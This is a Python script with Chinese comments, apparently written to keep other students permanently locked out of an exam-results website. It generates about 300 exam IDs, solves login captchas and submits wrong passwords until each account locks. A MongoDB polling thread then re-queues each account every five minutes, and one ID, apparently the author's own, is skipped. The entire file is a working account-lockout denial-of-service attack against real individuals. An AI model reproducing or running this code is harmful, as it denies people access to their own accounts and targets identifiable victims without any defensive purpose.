#!/usr/bin/python python3
# coding=utf-8
'''
Author: whalefall
Date: 2021-07-10 12:29:45
LastEditTime: 2021-07-12 00:58:15
Description: 多线程+队列版本 (放在旧的PC上执行)
Todo: 1. 官网策略: 账号密码错误5次锁定账号5分钟.
    2. 思路: 1)开一个进程池,接收验证码队列,并返回识别到的验证码.(看情况实现)
            2)多线程请求网址.
            3)一旦账号锁定成功就入MangoDB数据库记录锁定成功的时间,再开一个线程轮询数据库,检查是否有账号锁定
            时间长于5分钟6s,一旦有就提交到账号队列.
            4)把第一次就锁定成功的账号不修改数据库中时间戳
'''
import threading
import queue
from zk_func import *
import pymongo
import time
from concurrent.futures import ProcessPoolExecutor, ThreadPoolExecutor


# print(id_list)


myclient = pymongo.MongoClient("mongodb://localhost:27017/")
mydb = myclient["zk"]
mycol = mydb["zk_student"]
oneTimeLock = mydb["oneTimeLock"]


def writeMongoDB(id):
    timestamp = int(time.time())
    '''
    储存账号锁定的时间.并更新各账号.
    写入 monggoDB,传入id,自动生成时间戳.
    {"_id":"账号,插入时随之更新time","time":锁定时间戳}
    '''
    try:

        mydict = {"_id": id, "timestamp": timestamp}
        mycol.replace_one({"_id": id}, mydict, upsert=True)

    except Exception as e:
        print("写入MongoDB数据库出现问题", e)
    finally:
        myclient.close()


def checkTimeoutId():
    '''
    轮询 MongoDB 数据库,将超时的账号put到账号队列.
    '''
    while True:
        try:
            # myclient = pymongo.MongoClient("mongodb://localhost:27017/")
            # mydb = myclient["zk"]
            # mycol = mydb["zk_student"]

            for data in mycol.find():
                # print(data)
                timestamp = data["timestamp"]
                id = data["_id"]
                if timestamp == "running":
                    # 忽略 running 中的账号
                    # print("账号%s运行中" % (id))
                    continue
                if int(time.time()) - int(timestamp) >= 302:
                    id_queue.put(id, timeout=2)
                    # 并将数据库中的时间戳设置成运作中
                    mycol.replace_one({"_id": id}, {
                        "_id": id,
                        "timestamp": "running"
                    },
                        upsert=True)
                    print("账号:%s超时已提交账号队列" % (id))

        except Exception as e:
            print("读取MongoDB数据库出现问题", e)
        finally:
            myclient.close()


def main(id):
    '''
    传入考号进行处理,递归至账号锁定
    '''
    try:
        bot = Zkweb()
        code = bot.checkCode()
        if code == False:
            print("id:%s验证码为空!" % (id))
            main(id)
        result = bot.login(code, id)
        if result == False:
            print("%s验证码识别错误%s" % (id, code))
            main(id)
        if result == "PwdError":
            main(id)
        if result == "Locking":
            # 账号成功锁定,写入数据库
            writeMongoDB(id)
            id_queue.task_done()
            return
        else:
            return
    except Exception as e:
        print("[INFO]发生异常别怕,递归直至成功", e)
        main(id)


if __name__ == "__main__":
    # 遍历生成11个班级的考号信息
    # 21060515080613->中考考号
    # 待处理考号队列
    id_queue = queue.Queue()

    # 创建轮询账号数据库线程
    check_thread = threading.Thread(target=checkTimeoutId)
    check_thread.setDaemon(True)
    check_thread.start()

    # 仅仅锁定住宿班,降低系统负载
    for class_id in range(6, 12):
        for std_id in range(1, 51):
            if class_id == 6 and std_id == 13:
                continue
            id = "2106051508%02d%02d" % (class_id, std_id)
            id_queue.put(id)

    # 开进程池处理看看
    with ThreadPoolExecutor() as pool:
        while True:
            id = id_queue.get()
            pool.submit(main, id)
